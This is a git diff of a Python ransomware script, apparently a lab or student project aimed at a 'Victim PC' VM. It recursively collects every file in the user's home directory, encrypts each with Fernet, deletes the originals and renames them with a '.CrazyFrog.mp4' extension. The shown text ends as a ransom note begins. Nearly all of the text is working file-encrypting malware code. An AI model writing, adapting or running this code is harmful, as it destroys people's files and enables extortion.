@@ -1,58 +1,63 @@
-#####VM part, Victim PC#####
 
-##cryptography package has our fernet symetric enc, AES in CBC mode with a 128-bit key for encryption; using PKCS7 padding.HMAC using SHA256 for authentication.
-import signal
-from cryptography.fernet import Fernet 
+#############[Packages]#############
+###### cryptography package has our Fernet Symetric Encryption
+######  ↳ AES in CBC mode with a 128-bit key for encryption; using PKCS7 padding.
+######    HMAC using SHA256 for authentication.
+from cryptography.fernet import Fernet
 import os
-import glob ##finds all the pathnames matching a specified pattern
+import glob #finds all the pathnames matching a specified pattern
+####################################
 
 
 
+############[Directory Setup]############
 homeDir = os.path.expanduser('~') #grabs user home directory
-fern_key = Fernet.generate_key()
+files = glob.glob(f'{homeDir}/**/*.*', recursive=True) #grabs files we want to encrypt   
+                                                       #we can switch / for linux to \\ for windows
+#########################################
 
-key = open("secret.key", "wb")# as Enc_key:   #was secret.key
+
+
+############[Keygen]############
+fern_key = Fernet.generate_key()
+key = open("secret.key", "wb")
 key.write(fern_key)
 key.close()
-#print(f'value of my secret key is: {fern_key}')
+################################
 
 
-##maybe for loop with list of excluded file types, (.key and .py)
 
-files = glob.glob(f'{homeDir}/**/*.*', recursive=True) #grabs files we want to enc   #swithc \\ to / for linux   f'{homeDir}/**/*.*', recursive=True)    *.[!key]*
-#files = glob.glob(f'{homeDir}/**/*.[!py]*', recursive=True) #grabs files we want to enc   #swithc \\ to / for linux   f'{homeDir}/**/*.*', recursive=True)    *.[!key]*
-
-#############################################just added have to test
+############[Targeting Files]############
 file_list=[]
 for filename in files:
-    if ".key" not in filename and ".py" not in filename:
-        #print(f'im looking at: {filename}')
+    if ".key" not in filename and ".py" not in filename:    #This makes sure we do not accidentally Encrypt our Key and Ransomware
         file_list.append(filename)
+#########################################
 
 
 
-
-fernet = Fernet(fern_key) #was key
-
-
-
-for file in file_list:  ##was files
-    fileName = str(file)    ##added
-    extension = os.path.splitext(file)[1]  ###gets all extensions
-    
+############[Encrypting Files]############
+fernet = Fernet(fern_key) #Supply Fernet with our Key
+for file in file_list:
+    fileName = str(file)
+    extension = os.path.splitext(file)[1]  #gets extension
     
     with open(file, 'rb') as f:
         f_bytes=f.read()
     
     f_bytes_encrypted = fernet.encrypt(f_bytes)
     print(f'Your file {file} has been encrypted')
-    os.remove(file) #added
+    os.remove(file) #Removes our old unencrypted file
     
-    fileExtension = '.CrazyFrog.mp4'
-    encFile = fileName + fileExtension  ##works
+    fileExtension = '.CrazyFrog.mp4'    #This is just for fun, adds a Custom Extension
+    encFile = fileName + fileExtension  #Builds our Encrytped file with it's name + our Custom Extension
     
-    with open(encFile, 'wb') as f:      ###changed file to encFile
-        f.write(f_bytes_encrypted)
+    with open(encFile, 'wb') as f:      
+        f.write(f_bytes_encrypted)      #Writes the Encrypted bytes to our Encrypted file.
+                                        # ↳ Even though we removed the file itself earlier, we kept the bytes (f_bytes_encrypted), which we write to our encFile
+##########################################
+
+
 
 ransomNote="""
 Attention, your Personal Files have been Encrypted with a Government Grade Encryption System.
